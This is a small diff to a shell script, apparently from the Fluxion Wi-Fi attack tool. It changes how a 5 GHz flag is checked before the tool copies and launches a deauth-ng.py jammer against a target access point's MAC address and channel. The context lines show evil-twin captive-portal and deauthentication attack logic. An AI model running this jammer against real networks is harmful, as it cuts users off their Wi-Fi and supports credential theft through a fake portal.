@@ -1138,7 +1138,7 @@ captive_portal_generic() {
     </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
 
-if [ "$FLUXIONEnable5GHZ" != "" ];then
+if [ $FLUXIONEnable5GHZ -eq 1 ];then
     cp -r "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
     chmod +x "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
 fi
@@ -1493,7 +1493,7 @@ start_attack() {
   echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
   echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
 
-  if [ "$FLUXIONEnable5GHZ" != "" ]; then
+  if [ $FLUXIONEnable5GHZ -eq 1 ]; then
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
